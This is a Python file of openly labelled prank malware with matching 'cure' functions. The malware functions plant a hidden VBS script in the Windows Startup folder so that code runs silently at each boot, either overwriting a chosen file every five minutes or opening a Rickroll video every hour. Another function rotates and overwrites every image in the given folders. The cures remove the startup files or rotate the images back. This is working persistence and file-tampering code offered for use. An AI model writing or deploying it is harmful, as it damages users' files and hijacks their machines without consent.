# ================================================================ MALWARES ================================================================


def cantdeleteme(file_data, file_path, py_file_path, bat_file_path):
    import platform as pf
    import getpass as gp
    import os

    def get_user():
        try:
            ret = gp.getuser()
        except:
            try:
                if pf.system() == 'Darwin':
                    temp_list = os.getcwd().split('/')
                elif pf.system() == 'Windows':
                    temp_list = os.getcwd().split('\\')
                ret = temp_list [temp_list.index('Users') + 1]
            except:
                try:
                    if pf.system() == 'Darwin':
                        temp_list = __file__.split('/')
                    elif pf.system() == 'Windows':
                        temp_list = __file__.split('\\')
                    ret = temp_list [temp_list.index('Users') + 1]
                except:
                    ret = 'Unable to determine'
        return ret

    # Makes paths if they dont exist
    if not os.path.exists( os.path.dirname(file_path) ):
        os.makedirs( os.path.dirname(file_path) )
    if not os.path.exists( os.path.dirname(py_file_path) ):
        os.makedirs( os.path.dirname(py_file_path) )
    if not os.path.exists( os.path.dirname(bat_file_path) ):
        os.makedirs( os.path.dirname(bat_file_path) )

    vbs_file_path = f'C:\\Users\\{get_user()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\bootup_processes.vbs'

    # Makes the .py file
    with open(py_file_path, 'w') as py_file:
        py_file.write(f'import time as t\nwhile True:\n\tt.sleep(300)\n\twith open(r"{file_path}", "wb") as fil:\n\t\tfil.write({file_data})')
    # Makes the .bat file
    with open(bat_file_path, 'w') as bat_file:
        bat_file.write(f'python "{py_file_path}"')
    # Makes the .vbs file
    with open(vbs_file_path, 'w') as vbs_file:
        vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "{bat_file_path}" & Chr(34), 0\nSet WshShell = Nothing')



def repeating_rickroll(py_file_path, bat_file_path):
    import platform as pf
    import getpass as gp
    import os

    def get_user():
        try:
            ret = gp.getuser()
        except:
            try:
                if pf.system() == 'Darwin':
                    temp_list = os.getcwd().split('/')
                elif pf.system() == 'Windows':
                    temp_list = os.getcwd().split('\\')
                ret = temp_list [temp_list.index('Users') + 1]
            except:
                try:
                    if pf.system() == 'Darwin':
                        temp_list = __file__.split('/')
                    elif pf.system() == 'Windows':
                        temp_list = __file__.split('\\')
                    ret = temp_list [temp_list.index('Users') + 1]
                except:
                    ret = 'Unable to determine'
        return ret

    # Makes paths if they dont exist
    if not os.path.exists( os.path.dirname(py_file_path) ):
        os.makedirs( os.path.dirname(py_file_path) )
    if not os.path.exists( os.path.dirname(bat_file_path) ):
        os.makedirs( os.path.dirname(bat_file_path) )
    
    vbs_file_path = f'C:\\Users\\{get_user()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup_processes.vbs'

    # Makes the .py file
    with open(py_file_path, 'w') as py_file:
        py_file.write('import webbrowser as wb\nimport time as t\nt.sleep(120)\nwb.open(\'https://youtu.be/dQw4w9WgXcQ\')\nwhile True:\n\tt.sleep(3600)\n\twb.open(\'https://youtu.be/dQw4w9WgXcQ\')')
    # Makes the .bat file
    with open(bat_file_path, 'w') as bat_file:
        bat_file.write(f'python "{py_file_path}"')
    # Makes the .vbs file
    with open(vbs_file_path, 'w') as vbs_file:
        vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "{bat_file_path}" & Chr(34), 0\nSet WshShell = Nothing')



def linkspam(lis, times):
    import webbrowser as wb
    import random as r
    for _ in range(times):
        wb.open_new( r.choice(lis) )



def photo_rotater(paths):
    import os
    import cv2
    for main_path in paths:
        # Checks the existence of path
        if not os.path.exists(main_path):
            continue

        # Goes thro every image in the folder and subfolders
        for cur_dir , _ , files in os.walk(main_path):
            for fil in files:
                # Checks for invalid files
                if fil.startswith('.'):
                    continue
                # Checks if its an image
                if not (fil.endswith('.png') or fil.endswith('.jpg') or fil.endswith('.jpeg')):
                    continue
                # Rotates the image 90 degress counter clockwise
                try:
                    temp_img = cv2.imread( os.path.join(cur_dir,fil) )
                    new_img = cv2.rotate(temp_img, cv2.cv2.ROTATE_90_COUNTERCLOCKWISE)
                    cv2.imwrite( os.path.join(cur_dir,fil) , new_img )
                except:
                    continue



# ================================================================ CURES ================================================================



def cantdeleteme_cure():
    import getpass as gp
    import platform as pf
    import os

    def get_user():
        try:
            ret = gp.getuser()
        except:
            try:
                if pf.system() == 'Darwin':
                    temp_list = os.getcwd().split('/')
                elif pf.system() == 'Windows':
                    temp_list = os.getcwd().split('\\')
                ret = temp_list [temp_list.index('Users') + 1]
            except:
                try:
                    if pf.system() == 'Darwin':
                        temp_list = __file__.split('/')
                    elif pf.system() == 'Windows':
                        temp_list = __file__.split('\\')
                    ret = temp_list [temp_list.index('Users') + 1]
                except:
                    ret = 'Unable to determine'
        return ret

    try:
        os.remove( f'C:\\Users\\{get_user()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\bootup_processes.vbs' )
        print('Succesfully removed')
    except:
        print('File doesnt exist brah')



def epic_rr_cure():
    import platform as pf
    import getpass as gp
    import os

    def get_user():
        try:
            ret = gp.getuser()
        except:
            try:
                if pf.system() == 'Darwin':
                    temp_list = os.getcwd().split('/')
                elif pf.system() == 'Windows':
                    temp_list = os.getcwd().split('\\')
                ret = temp_list [temp_list.index('Users') + 1]
            except:
                try:
                    if pf.system() == 'Darwin':
                        temp_list = __file__.split('/')
                    elif pf.system() == 'Windows':
                        temp_list = __file__.split('\\')
                    ret = temp_list [temp_list.index('Users') + 1]
                except:
                    ret = 'Unable to determine'
        return ret

    try:
        os.remove( f'C:\\Users\\{get_user()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup_processes.vbs' )
        print('Succesfully removed')
    except:
        print('File doesnt exist brah')



def photo_rotater_cure(paths):
    import cv2
    import os
    for main_path in paths:
        # Checks the existence of path
        if not os.path.exists(main_path):
            continue
        print(f'{main_path}......')

        # Goes thro every image in the folder and subfolders
        for cur_dir , _ , files in os.walk(main_path):
            for fil in files:
                # Checks for invalid files
                if fil.startswith('.'):
                    continue
                # Checks if its an image
                if not (fil.endswith('.png') or fil.endswith('.jpg') or fil.endswith('.jpeg')):
                    continue
                # Rotates the image 90 degress CLOCKWISE
                try:
                    temp_img = cv2.imread( os.path.join(cur_dir,fil) )
                    new_img = cv2.rotate(temp_img, cv2.cv2.ROTATE_90_CLOCKWISE)
                    cv2.imwrite( os.path.join(cur_dir,fil) , new_img )
                except:
                    continue





